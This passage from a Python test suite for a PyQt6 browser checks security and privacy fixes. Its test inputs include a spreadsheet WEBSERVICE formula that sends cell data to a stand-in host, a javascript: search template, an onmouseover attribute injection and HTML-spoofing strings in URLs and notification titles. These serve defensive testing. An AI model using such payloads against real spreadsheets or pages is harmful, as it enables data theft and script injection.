H.wait_for(lambda: jsq(v9, "document.querySelectorAll('iframe').length")
           == 1, 6000)
check("multistream builds its grid",
      H.js(v9, "document.querySelectorAll('iframe').length") == 1)
check("...embedded for the page it is built on",
      "parent=127.0.0.1" in str(H.js(v9, "document.querySelector('iframe')"
                                         ".src")))
H.load(v9, srv.url("/twother")); H.spin(1200)
check("the next page in that tab is left as it is",
      H.js(v9, "!!document.getElementById('other') && "
               "document.querySelectorAll('iframe').length === 0"))

# a host that only contains discord.com is not Discord
check("subdomain counts as the host", br._host_is("ptb.discord.com",
                                                   "discord.com"))
check("a look-alike host does not",
      not br._host_is("notdiscord.com", "discord.com")
      and not br._host_is("discord.com.example.net", "discord.com"))
br.config["discordRoute"] = True
v10 = br.new_tab(); H.spin(300)
H.load(v10, srv.url("/twhome")); H.spin(600)
check("a link to x127.0.0.1.invalid is not routed into the 127.0.0.1 tab",
      br.discord_route("http://x127.0.0.1.invalid/", host="127.0.0.1")
      is False)
br.config["discordRoute"] = False

# an address fill goes only into boxes he can see
v11 = br.new_tab(); H.spin(300)
H.load(v11, srv.url("/sneaky")); H.spin(600)
_got = []
br.form_tool("fillident", view=v11, then=_got.append, arg={
    "fullname": "Ada Tester", "email": "ada@example.com",
    "phone": "+49 30 1", "street": "Teststr. 5", "city": "Berlin",
    "zip": "10115", "country": "Germany"})
H.wait_for(lambda: _got, 4000)
_vals = H.js(v11, "JSON.stringify(['full','mail','street','tel','zip','city',"
                  "'country'].map(function(i){return document"
                  ".getElementById(i).value}))")
check("the boxes he can see are filled",
      _vals and '"Ada Tester","ada@example.com"' in _vals, _vals)
check("off-screen, see-through, 1px and clipped boxes stay empty",
      _vals and _vals.endswith('"","","","",""]'), _vals)

# a card is not typed into a page that sends it in the clear
check("https is a place for a card",
      br._card_safe_url("https://shop.example/pay"))
check("this machine is too", br._card_safe_url("http://127.0.0.1:8000/")
      and br._card_safe_url("http://localhost/"))
check("plain http elsewhere is not",
      not br._card_safe_url("http://shop.example/pay"))
_said = []
_flash = br.flash
br.flash = lambda text, *a, **k: _said.append(str(text))
v12 = br.new_tab(); H.spin(300)
v12.load(B.QUrl("http://shop.invalid/pay")); H.spin(1500)
br.fill_card(view=v12, cvv="1")
br.flash = _flash
check("filling a card there is refused, and says why",
      _said == [br._ui_str("cardInsecure")], str(_said))

# a form draft never keeps a card number, a security code, an IBAN or a
# one-time code, and it goes back into the box it came from
import json as _json
br.config["formDraftsOn"] = True
v13 = br.new_tab(); H.spin(300)
H.load(v13, srv.url("/checkout2")); H.spin(600)
H.js(v13, "document.getElementById('msg').value='Long message here';"
          "document.getElementById('num').value='4111111111111111';"
          "document.querySelector('[name=cvc]').value='987';"
          "document.getElementById('ib').value='DE89370400440532013000';"
          "document.querySelector('[name=otp_code]').value='654321';"
          "document.querySelector('.t2').value='second box';")
_saved = []
br.save_form_draft(view=v13, then=_saved.append)
H.wait_for(lambda: _saved, 4000)
_disk = _json.dumps(br.config.get("formDrafts"))
check("the draft keeps the message", "Long message here" in _disk, _disk)
check("...but no card number, code, IBAN or one-time code",
      not any(x in _disk for x in ("4111111111111111", '"987"',
                                   "DE89370400440532013000", "654321")),
      _disk)
H.load(v13, srv.url("/checkout2")); H.spin(1200)
_back = []
br.restore_form_draft(view=v13, then=_back.append)
H.wait_for(lambda: _back, 4000)
H.spin(200)
check("a box with no name gets its own text back, not its neighbour's",
      H.js(v13, "document.querySelector('.t1').value") == ""
      and H.js(v13, "document.querySelector('.t2').value") == "second box",
      str((H.js(v13, "document.querySelector('.t1').value"),
           H.js(v13, "document.querySelector('.t2').value"))))
br.config["formDrafts"] = {"shop.example/pay": {"when": 1, "rows": [
    {"key": "#cardnumber", "value": "4111"},
    {"key": "input[name=otp_code]", "value": "1"},
    {"key": "#msg", "value": "keep me"}]}}
br.config["formHistory"] = {"shop.example": {"cvc": ["123"],
                                             "city": ["Berlin"]}}
br._scrub_secret_rows()
check("drafts already on disk lose their card rows",
      br.config["formDrafts"]["shop.example/pay"]["rows"]
      == [{"key": "#msg", "value": "keep me"}],
      str(br.config["formDrafts"]))
check("...and the form history its codes",
      br.config["formHistory"] == {"shop.example": {"city": ["Berlin"]}},
      str(br.config["formHistory"]))
br.config["formDrafts"] = {}
br.config["formHistory"] = {}

# an http login box belongs to the page in the tab, not to a picture
# another site pulled in from that host
_asked_auth = []
_real_get = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(
    lambda *a, **k: (_asked_auth.append(1), ("", False))[1])
_pw_was = br.config.get(B.VAULT_PASSWORD_KEY, True)
br.config[B.VAULT_PASSWORD_KEY] = True
br.vault.set_entry("localhost", "http", "ada", "letmein")
br._auth_tried = {}
v14 = br.new_tab(); H.spin(300)
H.load(v14, srv.url("/imgauth")); H.spin(2000)
check("another site's frame gets no saved login",
      not any("/auth/" in k for k in br._auth_tried), str(br._auth_tried))
check("...and puts up no dialog", _asked_auth == [], str(_asked_auth))
H.load(v14, srv.url("/auth/panel", host="localhost"))
H.wait_for(lambda: "you are in" in (jsq(v14, "document.body.innerText")
                                    or ""), 8000)
check("the tab's own page still gets the saved login, with no dialog",
      "you are in" in (H.js(v14, "document.body.innerText") or "")
      and _asked_auth == [],
      str(((H.js(v14, "document.body.innerText") or "")[:30], _asked_auth)))
B.QInputDialog.getText = _real_get
br.config[B.VAULT_PASSWORD_KEY] = _pw_was

# exported tables carry no cell a spreadsheet would run
import csv as _csv
_xdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.export_history(str(_xdir / "h.csv"), "csv", rows=[
    {"t": 0, "title": '=WEBSERVICE("http://x.invalid/?"&C2)',
     "url": "https://a.example/", "s": "main"}])
_cells = list(_csv.reader(open(str(_xdir / "h.csv"), encoding="utf-8")))
check("history export: a page title cannot be a formula",
      _cells[1][1].startswith("'="), str(_cells))
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": "x", "name": "+cmd.csv", "url": "https://a/",
                    "from": "", "size": 1, "t": 0, "state": "done"}]
br.export_downloads(str(_xdir / "d.csv"))
br.downloads[:] = _dl_was
_cells = list(_csv.reader(open(str(_xdir / "d.csv"), encoding="utf-8")))
check("downloads export: a file name cannot be a formula",
      _cells[1][0] == "'+cmd.csv", str(_cells))

# opening a downloaded .jar runs it (Java takes it from xdg-open): asked
# first, from the downloads page's Open as much as from the menu
(_xdir / "mod.jar").write_bytes(b"PK not really")
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": 991, "name": "mod.jar", "dir": str(_xdir),
                    "url": "https://a/", "t": 0, "state": "done"}]
_q, _opened = [], []
_real_q = B.QMessageBox.question
_real_open = B.QDesktopServices.openUrl
_real_popen = B.subprocess.Popen
B.QMessageBox.question = staticmethod(
    lambda *a, **k: (_q.append(1), B.QMessageBox.StandardButton.No)[1])
B.QDesktopServices.openUrl = staticmethod(lambda u: _opened.append(u))
B.subprocess.Popen = lambda *a, **k: _opened.append(a)
br.open_download(991)
br.open_download_file(991)
B.QMessageBox.question = _real_q
B.QDesktopServices.openUrl = _real_open
B.subprocess.Popen = _real_popen
br.downloads[:] = _dl_was
check("a downloaded .jar is not run without a yes, from either Open",
      _q == [1, 1] and _opened == [], str((_q, _opened)))

# taking files out of an archive never writes over his own
import zipfile as _zf
(_xdir / "readme.txt").write_text("mine")
with _zf.ZipFile(str(_xdir / "pack.zip"), "w") as z:
    z.writestr("inner/readme.txt", "theirs")
_one = br.archive_file(str(_xdir / "pack.zip"), "inner/readme.txt")
check("one file out of an archive leaves the file already there alone",
      (_xdir / "readme.txt").read_text() == "mine" and _one
      and _Path(_one).read_text() == "theirs", str(_one))
_first = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
(_Path(_first) / "inner" / "readme.txt").write_text("edited by him")
_second = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
check("unpacking again goes into a new folder, not over his edits",
      _second and _second != _first
      and (_Path(_first) / "inner" / "readme.txt").read_text()
      == "edited by him", str((_first, _second)))

# "strip metadata" strips it: no comment, no XMP with a GPS position
_img = B.QImage(8, 8, B.QImage.Format.Format_RGB32)
_img.fill(B.QColor("red"))
_img.setText("Comment", "secret-comment")
_img.setText("XML:com.adobe.xmp", "<x><exif:GPSLatitude>52,31.0N"
             "</exif:GPSLatitude></x>")
_img.save(str(_xdir / "snap.png"), "PNG")
_png = br.strip_metadata(str(_xdir / "snap.png"))
_jpg = br.strip_metadata(str(_xdir / "snap.png"), into="jpg")
_back = B.QImage(_png)
check("stripped picture: no text keys left",
      _png and _back.textKeys() == [], str(_back.textKeys()))
check("...and none written into a JPEG either",
      _jpg and b"GPSLatitude" not in open(_jpg, "rb").read()
      and b"secret-comment" not in open(_jpg, "rb").read())
check("...with the same pixels", _back.pixelColor(3, 3) == B.QColor("red"),
      str(_back.pixelColor(3, 3).name()))
check("a PNG with only a text chunk counts as carrying metadata",
      br.image_has_metadata(str(_xdir / "snap.png")))
check("...and the stripped copy as carrying none",
      not br.image_has_metadata(_png))
(_xdir / "pic.png").write_bytes(b"his own picture")
_img.save(str(_xdir / "pic.bmp"), "BMP")
_conv = br.convert_image(str(_xdir / "pic.bmp"), into="png")
check("converting never replaces a file already there",
      (_xdir / "pic.png").read_bytes() == b"his own picture"
      and _conv and _conv != str(_xdir / "pic.png"), str(_conv))

# yt-dlp finishes even when it talks a lot, and a private tab's video
# is not written into the downloads list
import os as _os, stat as _stat
_bin = _xdir / "bin"
_bin.mkdir()
(_bin / "yt-dlp").write_text("#!/bin/sh\nhead -c 300000 /dev/zero "
                             "| tr '\\0' x\nexit 0\n")
(_bin / "yt-dlp").chmod(0o755)
_path_was = _os.environ.get("PATH", "")
_os.environ["PATH"] = str(_bin) + ":" + _path_was
br.config["downloadDir"] = str(_xdir)
_said_dl = []
br.save_with_ytdlp(url="https://video.example/v", view=v14,
                   then=_said_dl.append)
H.wait_for(lambda: _said_dl, 15000)
check("a chatty yt-dlp still finishes", _said_dl == ["done"], str(_said_dl))
_pv = br.new_private_tab(); H.spin(400)
_rows_before = len(br.downloads)
_said_dl2 = []
br.save_with_ytdlp(url="https://video.example/secret", view=_pv,
                   then=_said_dl2.append)
H.wait_for(lambda: _said_dl2, 15000)
check("a private tab's video leaves no row in the downloads list",
      len(br.downloads) == _rows_before
      and not any("secret" in str(e.get("url")) for e in br.downloads),
      str(len(br.downloads) - _rows_before))
_os.environ["PATH"] = _path_was

# saving a page as a file never replaces one already there, and a
# private tab's page is saved without a row in the list
br.config["downloadDir"] = str(_xdir)
(_xdir / "other.md").write_text("his own notes")
v15 = br.new_tab(); H.spin(300)
H.load(v15, srv.url("/twother"))
# the file is named after the title: read before it came (a CPU quota),
# the name was made from the address instead
H.wait_for(lambda: v15.title() == "other", 6000)
_md = []
br.save_page_markdown(view=v15, then=_md.append)
H.wait_for(lambda: _md, 6000)
check("a saved page does not replace his file of the same name",
      (_xdir / "other.md").read_text() == "his own notes" and _md
      and _md[0].endswith("other (1).md"),
      str((_md, v15.title(), getattr(v15, "_last_title", None),
           v15.url().toString())))
H.load(_pv, srv.url("/twother")); H.spin(800)
_rows_before = len(br.downloads)
_md2 = []
br.save_page_markdown(view=_pv, then=_md2.append)
H.wait_for(lambda: _md2, 6000)
check("a private tab's saved page is not written into the list",
      _md2 and _md2[0] and len(br.downloads) == _rows_before,
      str((_md2, len(br.downloads) - _rows_before)))

# the address bar's "whole address" tooltip shows the address, not what
# its decoded letters spell out as markup
_long = ("https://e.example/" + "x" * 300
         + "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
br.show_address(_long)
_tip = br.urlbar.toolTip()
from PyQt6.QtGui import QTextDocument as _QTD
_doc = _QTD()
_doc.setHtml(_tip)
check("the long-address tooltip is plain text",
      "<h1>https://bank.example</h1>" in _doc.toPlainText()
      and "<h1>" not in _tip, _tip[-80:])
check("an empty tooltip stays empty", B.literal("") == "")

# the lock menu lists this site's permissions, not every site whose
# name contains this one's
_perm_was = br.config.get("permissions")
br.config["permissions"] = {"http://127.0.0.1:1|camera": "allow",
                            "https://x127.0.0.1.example|mic": "allow"}
_facts = br.site_info(v15)
check("site info: only this host's grants",
      list(_facts.get("permissions", {})) == ["http://127.0.0.1:1|camera"],
      str(_facts.get("permissions")))
br.config["permissions"] = _perm_was

# a site's search template is a web address or nothing
check("a javascript: search template is refused",
      br.note_opensearch("evil.example", "x",
                         "javascript:alert(1)//{searchTerms}") is False
      and "evil.example" not in br.opensearch_table())
check("an https one is kept",
      br.note_opensearch("good.example", "g",
                         "https://good.example/?q={searchTerms}") is True)
br.opensearch_table().pop("good.example", None)

# the cookie editor: one site's cookies, one jar, and a delete that
# reaches the engine
def _ck(name, value, domain):
    c = B.QNetworkCookie(name.encode(), value.encode())
    c.setDomain(domain)
    c.setPath("/")
    return c
v16 = br.new_tab(); H.spin(300)
H.load(v16, srv.url("/twhome")); H.spin(400)
_jar = br._view_jar(v16)
br._note_cookie(_ck("sess", "netflix-session", ".netflix.com"), jar=_jar)
br._note_cookie(_ck("xs", "x-own", ".x.com"), jar=_jar)
br._note_cookie(_ck("priv", "private-one", ".x.com"), jar="private")
_names = sorted(r["name"] for r in br.site_cookies("x.com"))
check("x.com's cookies are x.com's, from this jar only", _names == ["xs"],
      str(_names))
_txt = br.cookies_txt("x.com", str(_xdir / "cookies.txt"))
_body = open(_txt).read() if _txt else ""
check("...and so is its cookies.txt",
      "x-own" in _body and "netflix-session" not in _body
      and "private-one" not in _body, _body[-200:])
H.load(v16, srv.url("/setck")); H.spin(1200)
check("a page cookie is there to delete",
      "srv=1" in str(H.js(v16, "document.cookie")))
check("deleting it from the editor says so",
      br.delete_cookie("srv", "127.0.0.1", "/") is True)
H.spin(800)
check("...and the page no longer has it",
      "srv=1" not in str(H.js(v16, "document.cookie")),
      str(H.js(v16, "document.cookie")))

# a jar made after start-up (the private one here) has the same
# interceptor: blocked addresses stay blocked, and its requests stay
# out of the request log. (An earlier block closed this window's last
# tab, which closes the window and runs the exit clean-up that hands the
# interceptor back; asking again puts it back on every jar.)
br.request_watch()
br.config["urlRules"] = "/blockme"
v17 = br.new_tab(); H.spin(300)
H.load(v17, srv.url("/blockme")); H.spin(800)
check("a blocked address is blocked in a normal tab",
      H.js(v17, "!!document.getElementById('b')") is not True)
H.load(_pv, srv.url("/blockme")); H.spin(800)
check("...and in a private tab, whose jar came later",
      H.js(_pv, "!!document.getElementById('b')") is not True)
_vb = br.new_tab(session="reviewvb"); H.spin(300)
H.load(_vb, srv.url("/blockme")); H.spin(800)
check("...and in a virtual browser made after that",
      _vb.page().profile() is not br.profile
      and H.js(_vb, "!!document.getElementById('b')") is not True)
br.config["urlRules"] = ""
br.log_requests(True)
H.load(_pv, srv.url("/twother?private-visit")); H.spin(800)
H.load(v17, srv.url("/twother?normal-visit")); H.spin(800)
_urls = [r["url"] for r in br.request_rows()]
br.log_requests(False)
check("the request log has the normal tab's request",
      any("normal-visit" in u for u in _urls), str(_urls[:4]))
check("...and not the private one's",
      not any("private-visit" in u for u in _urls), str(_urls[:4]))

# a virus scan runs beside the window, not on it
(_bin / "clamscan").write_text("#!/bin/sh\nsleep 1.5\nexit 1\n")
(_bin / "clamscan").chmod(0o755)
_os.environ["PATH"] = str(_bin) + ":" + _path_was
(_xdir / "scanme.bin").write_bytes(b"x")
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": 992, "name": "scanme.bin", "dir": str(_xdir),
                    "url": "https://a/", "t": 0, "state": "done"}]
_scan = []
_t0 = _time.time()
br.scan_download(992, then=_scan.append)
_took = _time.time() - _t0
check("starting a scan does not hold the window", _took < 0.5,
      "%.2fs" % _took)
H.wait_for(lambda: _scan, 8000)
check("...and its answer still arrives", _scan == ["infected"], str(_scan))
br.downloads[:] = _dl_was
_os.environ["PATH"] = _path_was

# pages the browser builds out of text run no script
v18 = br.new_tab(); H.spin(300)
br.show_html("<!doctype html><title>t</title><script>document.title="
             "'ran'</script><a id=l href=\"javascript:document.title="
             "'clicked'\">x</a>", view=v18)
# the built page itself, before it is clicked: at a 30% CPU quota the
# check read the tab before the page was in
H.wait_for(lambda: jsq(v18, "!!document.getElementById('l')") is True, 8000)
H.js(v18, "document.getElementById('l').click(); 1"); H.spin(400)
_t18 = jsq(v18, "document.title")
check("a built page's script and javascript: link stay dead",
      _t18 == "t", str(_t18))
_mm = br.minimessage_html('<gradient:red" onmouseover="alert(1):blue>hi')
check("a MiniMessage gradient cannot write an attribute",
      'onmouseover="' not in _mm and "<span" not in _mm, _mm[-160:])
check("...while a real one still draws",
      "linear-gradient(90deg,#ff5555,#5555ff)"
      in br.minimessage_html("<gradient:red:blue>hi"))
H.load(v18, srv.url("/twhome")); H.spin(500)
br.override_place(view=v18, zone="Asia/Kolkata"); H.spin(300)
check("a half-hour time zone is told as one",
      H.js(v18, "new Date().getTimezoneOffset()") == -330,
      str(H.js(v18, "new Date().getTimezoneOffset()")))
br.responsive_preview("phone", view=v18)
def _all_actions(m):
    for a in m.actions():
        yield a
        if a.menu() is not None:
            yield from _all_actions(a.menu())
_off = [a for a in _all_actions(br.dev_menu())
        if a.text() == br._ui_str("devSizeOff")]
if _off:
    _off[0].trigger()
check("the dev menu's size off gives the tab its size back",
      _off and v18.maximumWidth() == 16777215, str(v18.maximumWidth()))
br.request_watch().log[:] = [{"url": "https://a/", "host": "a",
                              "method": "GET", "kind": 0, "t": 0}]
_har = br.export_har(str(_xdir / "r.har"))
check("a HAR's times are UTC, as its Z says",
      '"1970-01-01T00:00:00Z"' in open(_har).read() if _har else False)
br.request_watch().log[:] = []
check("a typed javascript: address is searched for, never run",
      not br._resolve_typed("javascript://%0aalert(1)").lower()
      .startswith("javascript"), br._resolve_typed("javascript://%0aalert(1)"))

# Sec-GPC goes out with ad blocking off, too
br.config["adBlock"] = False
_gkey = B.Browser.GUARD_KEY.get("gpc") if hasattr(B.Browser, "GUARD_KEY") \
    else None
if _gkey and B.page_guard is not None:
    _gpc_was = br.config.get(_gkey)
    br.config[_gkey] = True
    H.load(v18, srv.url("/echo")); H.spin(800)
    _hdrs = str(H.js(v18, "document.body.innerText"))
    check("with the GPC guard on, Sec-GPC is sent (ad blocking off)",
          "sec-gpc: 1" in _hdrs.lower(), _hdrs[:300])
    # put back as it was: a key that was not there is taken out again,
    # not left as null (guard_menu later raised on it)
    if _gpc_was is None:
        br.config.pop(_gkey, None)
    else:
        br.config[_gkey] = _gpc_was

# "allow this time" is this time: the engine does not write it down
# behind the browser's back, and the next visit asks again
from PyQt6.QtWebEngineCore import QWebEnginePermission as _QWP
v19 = br.new_tab(); H.spin(300)
H.load(v19, srv.url("/notif")); H.spin(1500)
_card = getattr(br, "_perm_widget", None)
_once = _card.findChild(B.QToolButton, "permonce") if _card is not None \
    else None
check("a site asking for notifications gets a card with 'this time'",
      _once is not None)
if _once is not None:
    H.wait_for(lambda: _once.isEnabled(), 3000)   # fix261's moment
    _once.click(); H.spin(800)
check("...and 'this time' answers it", H.js(v19, "window.asked") == "granted",
      str(H.js(v19, "window.asked")))
_st = br.profile.queryPermission(
    B.QUrl(srv.url("/")), _QWP.PermissionType.Notifications).state()
check("the engine keeps no grant of its own after 'this time'",
      _st != _QWP.State.Granted, str(_st))
br._perm_widget = None
br.close_tab(br.tabs.indexOf(v19), ask=False); H.spin(500)
v19 = br.new_tab(); H.spin(300)
H.load(v19, srv.url("/notif")); H.spin(1500)
_card2 = getattr(br, "_perm_widget", None)
check("...so the next visit, in a new tab, asks again",
      _card2 is not None and H.js(v19, "window.asked") == "",
      str((H.js(v19, "window.asked"), _card2)))
if _card2 is not None:
    _deny = _card2.findChild(B.QToolButton, "permdeny")
    if _deny is not None:
        H.wait_for(lambda: _deny.isEnabled(), 3000)
        _deny.click(); H.spin(400)

# the status line shows where a link goes as text, never as markup
br.show_hovered_link("https://www.google.com/url?q=https://x.example/"
                     "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
_hl = getattr(br, "_hoverlbl", None)
check("the status line is plain text",
      _hl is not None and _hl.textFormat() == B.Qt.TextFormat.PlainText
      and "<h1>" in _hl.text(), _hl.text() if _hl is not None else None)
_sl_was = br.config.get("statusLine")
br.config["statusLine"] = "bar"
br.urlbar.clearFocus()
br.show_hovered_link("https://www.google.com/url?q=https://x.example/"
                     "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
_bh = getattr(br, "_barhover", None)
check("...and so is the one laid over the address bar",
      _bh is not None and _bh.textFormat() == B.Qt.TextFormat.PlainText,
      str(_bh.textFormat()) if _bh is not None else None)
br.config["statusLine"] = _sl_was or "bottom"

# a certificate exception is that certificate, or nothing
br.config["certExceptions"] = {"legacy.lan": True}
check("an old catch-all exception no longer passes any certificate",
      br.certificate_excepted("legacy.lan", "ab" * 32) is False)
check("...though the host still shows as having one",
      br.certificate_excepted("legacy.lan") is True)
check("a yes with no certificate to pin is not kept",
      br.trust_certificate("nofp.lan", "") is False
      and "nofp.lan" not in br.certificate_exceptions())
br.config["certExceptions"] = {}

# menu entries whose lambda took the "checked" flag as their argument
br.tabs.setCurrentWidget(v15); H.spin(200)
_got = []
_sc, _scn = br.show_certificate, br.show_connection
br.show_certificate = lambda h=None: _got.append(("cert", h))
br.show_connection = lambda h=None: _got.append(("conn", h))
for _a in br.certificate_menu().actions():
    if _a.text() in (br._ui_str("certShow") % "127.0.0.1",
                     br._ui_str("connDetails")):
        _a.trigger()
br.show_certificate, br.show_connection = _sc, _scn
check("the lock menu's certificate and connection entries get the host",
      _got == [("cert", "127.0.0.1"), ("conn", "127.0.0.1")], str(_got))

# a locked window's title says nothing about the page behind the cover
br.set_browser_lock("review-lock")
br._sync_window_title()
_was_title = br.windowTitle()
br.lock_browser()
check("a locked window's title hides the page's",
      "other" in _was_title and "other" not in br.windowTitle(),
      str((_was_title, br.windowTitle())))
br.unlock_browser()
check("...and unlocking brings it back", "other" in br.windowTitle(),
      br.windowTitle())
br.set_browser_lock("")

# a secret the browser copies stays out of clip histories, its own and
# the desktop's
br.watch_clipboard(True)
br._copy_secret_text("hunter2-review")
H.spin(300)
_md = B.QGuiApplication.clipboard().mimeData()
check("a copied secret carries the desktop's 'do not keep' hint",
      _md is not None and bytes(_md.data("x-kde-passwordManagerHint"))
      == b"secret")
_clips = [c["text"] for c in (br.desk().clips() if br.desk() else [])]
check("...and is not in the browser's clip history",
      "hunter2-review" not in _clips, str(_clips[:3]))
br.watch_clipboard(False)

# a page cannot make the snippet expander type out a snippet for it
_drawer = br.desk()
if _drawer is not None:
    _drawer.set_snippet("zqsnip", "SECRET-SNIPPET-TEXT")
    br.config["snippets"] = True
    br.refresh_snippet_script()
    v20 = br.new_tab(); H.spin(300)
    H.load(v20, srv.url("/drafts")); H.spin(800)
    H.js(v20, "var f=document.getElementById('n'); f.focus();"
              "f.value='zqsnip '; f.setSelectionRange(7,7);"
              "f.dispatchEvent(new KeyboardEvent('keyup',"
              "{key:' ',bubbles:true})); 1")
    H.spin(300)
    check("a page's own fake key press does not expand a snippet",
          "SECRET" not in str(H.js(v20, "document.getElementById('n').value")),
          str(H.js(v20, "document.getElementById('n').value")))
    H.js(v20, "var f=document.getElementById('n'); f.value=''; f.focus(); 1")
    v20.setFocus(); H.spin(100)
    H.type_text(v20, "zqsnip ")
    H.spin(300)
    check("...while real typing still does",
          "SECRET-SNIPPET-TEXT" in str(H.js(v20,
                                           "document.getElementById('n').value")),
          str(H.js(v20, "document.getElementById('n').value")))
    _drawer.set_snippet("zqsnip", "")
    br.refresh_snippet_script()

# two timers of the same name: the first one up takes only itself
br.config["timers"] = []
br.start_timer(1)
br.start_timer(2)
br.timers()[0]["at"] = 1
br._desk_tick()
check("a timer that is up leaves its namesake running",
      len(br.timers()) == 1 and br.timers()[0]["at"] > 1, str(br.timers()))
br.config["timers"] = []

# a private tab is not snoozed (written down, back as an ordinary tab)
_snz_was = list(br.config.get("snoozed") or [])
check("a private tab cannot be snoozed",
      br.snooze_tab(index=br.tabs.indexOf(_pv), minutes=5) is None
      and list(br.config.get("snoozed") or []) == _snz_was
      and br.tabs.indexOf(_pv) >= 0)
# and twelve due snoozes open ten now and keep two, not drop them
br.config["snoozed"] = [{"url": srv.url("/twhome?s=%d" % i), "title": "s",
                         "at": 1} for i in range(12)]
check("ten due snoozes open at a time...", br.wake_snoozed() == 10)
check("...and the other two wait for the next look",
      len(br.snoozed_tabs()) == 2, len(br.snoozed_tabs()))
br.config["snoozed"] = _snz_was

# a new day warns again about a site limit
br._limit_said = {"x.example": True}
br._limit_warned = {"x.example": True}
br.config["siteTime"] = {"day": "2000-01-01", "x.example": 9999}
br.site_minutes_today()
check("the day roll-over lets the limit warnings come again",
      br._limit_said == {} and br._limit_warned == {})

# exporting the highlights twice keeps both files
br.config["highlights"] = {"https://a.example/": ["one marked line"]}
_h1 = br.export_highlights()
_h2 = br.export_highlights()
check("a second highlights export does not replace the first",
      _h1 and _h2 and _h1 != _h2, str((_h1, _h2)))
br.config["highlights"] = {}

# an encrypted history is never written out plain while the vault is shut,
# and what was read meanwhile is kept and written under the key later
_hf = B.HISTORY_FILE
_hist_was = list(br.history)
_file_was = _hf.read_bytes() if _hf.exists() else None
_enc_was = br.config.get("historyEncrypted")
_key = b"k" * 32
br.config["historyEncrypted"] = True
br.history_key = lambda: _key
br.history[:] = [{"url": "https://older.example/", "title": "Older", "t": 1}]
br.save_history()
br.history_key = lambda: None
br._history_locked = True
br.history[:] = []
_sealed = _hf.read_bytes()
br._record_history(B.QUrl("https://visited-while-locked.example/"),
                   "Locked visit")
_now = _hf.read_bytes()
check("with the vault shut, the encrypted history file is left alone",
      _now == _sealed and _now.startswith(B.HISTORY_MAGIC), _now[:12])
check("...and no visit lands on disk in the clear",
      b"visited-while-locked" not in _now)
br.history_key = lambda: _key
br.unlock_history()
_urls = [e["url"] for e in br.history]
check("opening the vault brings back the old history and keeps the new",
      _urls == ["https://older.example/",
                "https://visited-while-locked.example/"], str(_urls))
br._history_locked = False
check("...and both are written down, under the key",
      [e["url"] for e in br._read_history()] == _urls
      and _hf.read_bytes().startswith(B.HISTORY_MAGIC))
br.__dict__.pop("history_key", None)
br.config["historyEncrypted"] = _enc_was
br._history_locked = False
br._history_unsaved = False
br.history[:] = _hist_was
if _file_was is None:
    _hf.unlink()
else:
    _hf.write_bytes(_file_was)

# a toast is text: a web notification cannot draw its own "browser" message
class _Note2:
    def origin(self): return B.QUrl("https://n.example/")
    def title(self): return "<h1>Update required</h1>"
    def message(self): return "body"
    def show(self): pass
    def close(self): pass
br.config["desktopNotify"] = False
br._web_notification(_Note2(), private=True)
_fl = getattr(br, "_flash", None)
check("a notification's title shows as text in the toast",
      _fl is not None and _fl.textFormat() == B.Qt.TextFormat.PlainText
      and "<h1>" in _fl.text(), _fl.text() if _fl is not None else None)

# "close unused tabs" keeps the normal ones as bookmarks, never a private one
_pv3 = br.new_private_tab(); H.spin(300)
H.load(_pv3, srv.url("/twother?unused-private")); H.spin(600)
br.tabs.setCurrentWidget(v15); H.spin(100)
# after the switch: leaving a tab marks it as just seen
_pv3._last_seen = 1
_bm_before = len(br.bookmarks)
_closed = br.close_unused_tabs(days=1)
check("closing unused tabs does not bookmark a private one",
      any(r["view"] is _pv3 for r in _closed)
      and not any("unused-private" in str(e.get("url"))
                  for e in br.bookmarks),
      str((len(_closed), len(br.bookmarks) - _bm_before)))

# a capture copied "with its link" carries no path of this machine
if B.capture is not None:
    br.config["shotDir"] = str(_xdir)
    _pic = B.QImage(20, 20, B.QImage.Format.Format_RGB32)
    _pic.fill(B.QColor("blue"))
    _txt = br.copy_with_link(image=_pic, view=v15)
    _md = B.QGuiApplication.clipboard().mimeData()
    check("a capture with its link names the page, not a local file",
          _txt and "file://" not in _txt
          and "file://" not in (_md.html() if _md is not None else "")
          and _md is not None and _md.hasImage(), str(_txt)[:120])

# a private tab is not captured by any of the capture tools
if B.capture is not None:
    br.config["shotPrivate"] = False
    _pv4 = br.new_private_tab(); H.spin(300)
    H.load(_pv4, srv.url("/twother")); H.spin(600)
    br.tabs.setCurrentWidget(_pv4); H.spin(100)
    _caps_before = list(br.config.get("shotHistory") or [])
    _outs = [br.copy_with_link(view=_pv4), br.annotate(view=_pv4),
             br.stamp_capture(view=_pv4), br.shot_mobile(view=_pv4),
             br.shot_inner("p", view=_pv4), br.capture_diff(view=_pv4),
             br.timelapse(True, view=_pv4)]
    check("no capture tool pictures a private tab",
          all(not o for o in _outs)
          and list(br.config.get("shotHistory") or []) == _caps_before,
          str(_outs))
    br.timelapse(False)

# a tab recorded with its sound records the output, not the microphone
class _FakeProc:
    started = []
    def __init__(self, *a, **k): pass
    def start(self, prog, args): _FakeProc.started.append([prog] + list(args))
    # a start ends the recorder already going (fix246)
    def terminate(self): pass
    def kill(self): pass
    def waitForFinished(self, ms=0): return True
_real_qp = B.QProcess
_real_tools = br.record_tools
B.QProcess = _FakeProc
for _rec in ("/usr/bin/parec", "/usr/bin/ffmpeg"):
    br.record_tools = lambda r=_rec: {"recorder": r}
    br._record_audio_start(microphone=False)
    br._record_audio_start(microphone=True)
B.QProcess = _real_qp
br.__dict__.pop("record_tools", None)
br._audio_proc = None    # the last stand-in is not left as his recorder
_tab_p, _mic_p, _tab_f, _mic_f = _FakeProc.started
check("parec records the output's monitor for a tab, the source for a voice",
      "--device=@DEFAULT_MONITOR@" in _tab_p
      and "--device=@DEFAULT_SOURCE@" in _mic_p, str((_tab_p, _mic_p)))
check("...and so does ffmpeg",
      _tab_f[_tab_f.index("-i") + 1] == "@DEFAULT_MONITOR@"
      and _mic_f[_mic_f.index("-i") + 1] == "@DEFAULT_SOURCE@",
      str((_tab_f, _mic_f)))

# captions are never made from a file of his a page points its video at
_jobs, _said_cap = [], []
_ct = br.caption_tools
